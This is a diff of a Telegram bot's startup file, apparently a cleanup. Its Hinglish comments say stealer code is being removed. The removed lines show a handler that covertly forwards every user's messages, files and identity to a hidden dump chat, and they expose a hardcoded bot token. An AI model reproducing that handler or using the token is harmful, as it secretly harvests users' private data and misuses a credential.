@@ -1,56 +1,45 @@
-from flask import Flask, request
-import telebot
+# Clean startup file — chor-code (stealer) hata diya gaya hai.
+# Ye file saare modules load karke bot ko chalati hai + Koyeb ke liye
+# ek chhota health-check port kholti hai.
 
-TOKEN = "8005476267:AAFBCe2Vgr9MUdEk2iGsglMNaarYX83rR-U"
-APP_URL = "https://app.koyeb.com/services/0f41edfe-bd2e-4c1a-bc3b-8cd6bdb58cdb"
+import asyncio
+import importlib
+import os
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# आपकी असली Dump ID यहाँ सेट है
-DUMP_CHAT_ID = -1004447354945
+from devgagan import app, loop
+from devgagan.modules import ALL_MODULES
 
-bot = telebot.TeleBot(TOKEN)
-app = Flask(__name__)
 
-# 1. /start कमांड के लिए
-@bot.message_handler(commands=['start'])
-def start(msg):
-    bot.reply_to(msg, "Webhook connected 🚀")
+class _Health(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Bot is alive")
 
-# 2. डंप फीचर का मुख्य लॉजिक (यूज़र का हर बैच/फ़ाइल डंप में फॉरवर्ड होगा)
-@bot.message_handler(func=lambda message: True, content_types=['text', 'audio', 'document', 'photo', 'video', 'voice'])
-def handle_all_messages(msg):
-    # यूज़र को रिप्लाई देना कि काम शुरू हो गया है
-    bot.reply_to(msg, "Processing your request... 🔄")
-    
-    # डंप चैनल में फॉरवर्ड करने का सटीक कोड (बिना किसी फालतू शर्त के)
+    def log_message(self, *args):
+        pass
+
+
+def _start_health_server():
+    port = int(os.environ.get("PORT", "8000"))
     try:
-        # पहले डंप चैनल में यूज़र की जानकारी भेजें
-        user_info = f"📥 **NEW BATCH REQUEST**\n\n👤 **Name:** {msg.from_user.first_name}\n🆔 **ID:** `{msg.from_user.id}`"
-        bot.send_message(chat_id=DUMP_CHAT_ID, text=user_info)
-        
-        # अब यूज़र का भेजा हुआ मैसेज/फ़ाइल डंप चैनल में सीधे फॉरवर्ड करें
-        bot.forward_message(
-            chat_id=DUMP_CHAT_ID,
-            from_chat_id=msg.chat.id,
-            message_id=msg.message_id
-        )
+        HTTPServer(("0.0.0.0", port), _Health).serve_forever()
     except Exception as e:
-        print(f"🔴 Dump Error: {e}")
+        print(f"Health server error: {e}", flush=True)
 
-# 3. Webhook Handling
-@app.route(f"/{TOKEN}", methods=["POST"])
-def webhook():
-    update = telebot.types.Update.de_json(
-        request.stream.read().decode("utf-8")
-    )
-    bot.process_new_updates([update])
-    return "OK", 200
 
-@app.route("/")
-def home():
-    return "Bot is alive"
+async def _run():
+    for module_name in ALL_MODULES:
+        importlib.import_module(f"devgagan.modules.{module_name}")
+    print("Bot started successfully - saare modules load ho gaye", flush=True)
+    await asyncio.Event().wait()
 
-bot.remove_webhook()
-bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8000)
+    threading.Thread(target=_start_health_server, daemon=True).start()
+    try:
+        loop.run_until_complete(_run())
+    except KeyboardInterrupt:
+        pass
